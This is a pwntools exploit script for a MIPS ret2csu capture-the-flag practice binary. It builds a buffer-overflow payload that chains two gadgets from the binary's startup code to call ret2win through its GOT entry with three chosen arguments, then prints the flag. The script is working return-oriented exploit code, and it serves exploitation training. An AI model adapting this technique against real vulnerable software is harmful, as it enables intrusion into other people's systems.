#/usr/bin/python3
from pwn import process, p32, log

shell = process("./ret2csu_mipsel")

offset = 36
junk = b"A" * offset

arguments  = b""
arguments += p32(0xdeadbeef)
arguments += p32(0xcafebabe)
arguments += p32(0xd00df00d)

payload  = b""
payload += junk
payload += p32(0x4009c0) # lw $ra, 0x34($sp); lw $s5, 0x30($sp); lw $s4, 0x2c($sp); lw $s2, 0x24($sp); lw $s1, 0x20($sp); lw $s0, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x38
payload += p32(0x0) * 7  # padding
payload += p32(0x411058) # ret2win@got
payload += p32(0x0) * 2  # padding
payload += arguments     # args
payload += p32(0x4009a0) # lw $t9, ($s0); addiu $s1, $s1, 1; move $a2, $s5; move $a1, $s4; jalr $t9; move $a0, $s3;

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
